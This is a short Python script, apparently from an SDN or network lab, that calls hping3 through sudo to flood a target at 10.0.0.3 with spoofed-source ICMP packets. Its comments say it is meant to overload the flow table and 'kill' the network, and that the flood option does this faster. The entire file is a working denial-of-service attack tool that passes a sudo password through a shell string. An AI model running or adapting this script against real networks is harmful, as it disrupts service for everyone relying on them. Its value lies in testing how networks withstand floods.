import os

# This script is used to flood the flow table
# Use over 2000 packages to kill the network
data_size = "5"
packages = "1800"
dest_ip = "10.0.0.3"
sudoPassword = ''

# You can use flood instead of faster, but this will result in a lot faster overload of the table
# and will ''kill'' the network after a few seconds.
os.system('echo %s|sudo -S %s' % (sudoPassword, "hping3 --faster -c " + packages + " --icmp -p 7 " + "-d " + data_size + " --rand-source " + dest_ip))
